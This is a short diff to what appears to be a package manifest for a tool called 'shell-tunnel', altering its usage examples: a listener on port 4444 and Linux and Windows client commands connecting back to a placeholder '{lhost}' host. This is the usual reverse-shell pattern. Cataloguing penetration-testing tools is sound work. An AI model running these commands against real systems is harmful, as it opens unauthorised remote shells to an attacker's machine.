@@ -6,9 +6,9 @@ upstream = "https://github.com/Real-Fruit-Snacks/shell-tunnel"
 licence = "GPL-3.0"
 arch = "x86_64"
 examples = [
-  "shell-tunnel -l -v -p 4444",
-  "./shell-tunnel -d {lhost}:4444",
-  "shell-tunnel.exe -d {lhost}:4444",
+  "shell-tunnel -l -N -v -p 4444",
+  "./shell-tunnel -d -p 4444 {lhost}",
+  "shell-tunnel.exe -d -p 4444 {lhost}",
 ]
 
 [[command]]
